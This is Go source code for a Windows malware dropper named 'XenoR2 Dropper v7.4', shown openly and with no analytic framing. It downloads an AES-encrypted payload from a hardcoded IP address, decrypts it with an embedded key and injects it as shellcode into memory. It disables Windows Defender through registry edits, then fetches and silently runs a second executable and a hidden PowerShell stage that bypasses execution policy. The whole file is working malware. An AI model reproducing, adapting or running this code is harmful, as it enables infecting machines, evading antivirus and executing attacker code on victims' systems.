// XenoR2 Dropper v7.4
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"
)

func main() {
	defer func() {
		if r := recover(); r != nil {
			lp := filepath.Join(os.Getenv("TEMP"), "dr.log")
			f, _ := os.OpenFile(lp, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if f != nil {
				f.WriteString(fmt.Sprintf("[PANIC] %v\n", r))
				f.Close()
			}
		}
	}()

	lp := filepath.Join(os.Getenv("TEMP"), "dr.log")
	wl := func(s string) {
		f, _ := os.OpenFile(lp, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if f != nil {
			f.WriteString(fmt.Sprintf("[%s] %s\n", time.Now().Format("15:04:05"), s))
			f.Close()
		}
	}

	wl("=== START ===")
	wl(fmt.Sprintf("pid=%d temp=%s", os.Getpid(), os.Getenv("TEMP")))

	// Download test
	wl("testing http...")
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	cl := &http.Client{Transport: tr, Timeout: 15 * time.Second}
	resp, err := cl.Get("https://193.26.115.196/sgn/elevator.sgn.bin.aes")
	if err != nil {
		wl("HTTP err: " + err.Error())
		return
	}
	enc, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	wl(fmt.Sprintf("downloaded %d bytes", len(enc)))

	// AES decrypt
	wl("decrypting...")
	kv, _ := base64.StdEncoding.DecodeString("R+uYGNw7dWNd5eF4izMvNSmQjh88zMBP606fHvkrk6cscnenBKfZBdWDof++/0H3")
	if len(kv) < 48 {
		wl("key short: " + fmt.Sprint(len(kv)))
		return
	}
	block, _ := aes.NewCipher(kv[:32])
	dec := cipher.NewCBCDecrypter(block, kv[32:48])
	out := make([]byte, len(enc))
	dec.CryptBlocks(out, enc)
	if n := int(out[len(out)-1]); n > 0 && n <= 16 {
		out = out[:len(out)-n]
	}
	wl(fmt.Sprintf("decrypted %d bytes", len(out)))

	// Shellcode inject
	wl("injecting...")
	k32 := syscall.NewLazyDLL("kernel32.dll")
	va := k32.NewProc("VirtualAlloc")
	rm := k32.NewProc("RtlMoveMemory")
	ct := k32.NewProc("CreateThread")

	addr, _, errVa := va.Call(0, uintptr(len(out)), 0x3000, 0x40)
	if addr == 0 {
		wl("VA fail: " + fmt.Sprint(errVa))
		return
	}
	wl(fmt.Sprintf("VA ok: 0x%X", addr))

	rm.Call(addr, uintptr(unsafe.Pointer(&out[0])), uintptr(len(out)))
	var tid uint32
	th, _, errCt := ct.Call(0, 0, addr, 0, 0, uintptr(unsafe.Pointer(&tid)))
	wl(fmt.Sprintf("CT: th=%d tid=%d err=%v", th, tid, errCt))

	// Wait
	wl("sleep 8s...")
	time.Sleep(8 * time.Second)
	wl("after sleep")

	// Defender kill
	exec.Command("reg", "add", `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender`, "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f").Run()
	exec.Command("reg", "add", `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection`, "/v", "DisableRealtimeMonitoring", "/t", "REG_DWORD", "/d", "1", "/f").Run()
	wl("defender disabled")

	// update.exe
	wl("downloading update.exe...")
	resp2, _ := cl.Get("https://193.26.115.196/update.exe")
	if resp2 != nil {
		ud, _ := io.ReadAll(resp2.Body)
		resp2.Body.Close()
		tmp := filepath.Join(os.Getenv("TEMP"), "up.exe")
		os.WriteFile(tmp, ud, 0644)
		c := exec.Command(tmp, "kill")
		c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		c.Start()
		wl(fmt.Sprintf("update started %d bytes", len(ud)))
	}

	time.Sleep(5 * time.Second)

	// stage PS1
	wl("downloading stage...")
	resp3, _ := cl.Get("https://193.26.115.196/stage_v6_pulsaar.ps1")
	if resp3 != nil {
		ps, _ := io.ReadAll(resp3.Body)
		resp3.Body.Close()
		tmp := filepath.Join(os.Getenv("TEMP"), "s.ps1")
		os.WriteFile(tmp, ps, 0644)
		c := exec.Command("powershell.exe", "-ep", "bypass", "-w", "hidden", "-File", tmp)
		c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		c.Start()
		wl(fmt.Sprintf("stage started %d bytes", len(ps)))
	}

	wl("=== DONE ===")
}
